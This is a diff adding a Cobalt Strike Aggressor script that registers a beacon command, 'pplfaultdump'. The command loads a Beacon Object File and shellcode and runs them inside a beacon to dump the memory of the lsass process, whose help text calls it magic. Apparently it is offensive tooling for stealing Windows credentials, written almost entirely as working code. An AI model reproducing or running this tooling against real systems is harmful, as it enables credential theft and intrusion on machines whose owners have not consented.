@@ -1,0 +1,25 @@
+sub readfile{
+    $handle = openf(script_resource($1));
+    $data = readb($handle, -1);
+    closef($handle);
+    return $data;
+}
+
+alias pplfaultdump {
+    local('$args $bof $shellcode $pid $outpath $handle');
+    if(size(@_) != 3)
+    {
+        berror($1, beacon_command_detail("pplfaultdump"));
+        return;
+    }
+    $bof = readfile("entry.obj");
+    $shellcode = readfile("DumpShellcode.exe.shellcode");
+    $args = bof_pack($1, "iZb", $2, $3, $shellcode);
+    beacon_inline_execute($1, $bof, "go", $args);
+}
+
+beacon_command_register(
+	"pplfaultdump",
+	"uses magic to dump lsass",
+	"Synopsis: pplfaultdump <pid> <outputpath> "
+);
